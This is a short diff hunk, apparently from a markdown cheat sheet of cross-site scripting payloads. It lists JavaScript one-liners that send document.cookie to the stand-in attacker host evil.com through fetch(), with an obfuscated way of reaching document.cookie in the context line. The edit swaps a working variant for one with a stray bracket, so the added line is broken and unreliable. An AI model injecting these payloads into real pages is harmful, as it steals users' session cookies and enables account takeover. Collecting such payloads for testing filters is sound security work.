@@ -37,7 +37,7 @@ window["doc"+"ument"]["cookie"]
 ```js
 fetch("//evil.com/?c="+document.cookie)
 fetch("//evil.com/?c=".concat(document.cookie))
-fetch(["//evil.com/?c=", document.cookie].join())
+fetch("//evil.com/?c=", document.cookie].join())
 fetch(`//evil.com/?c=${document.cookie}`) 
 ```
 
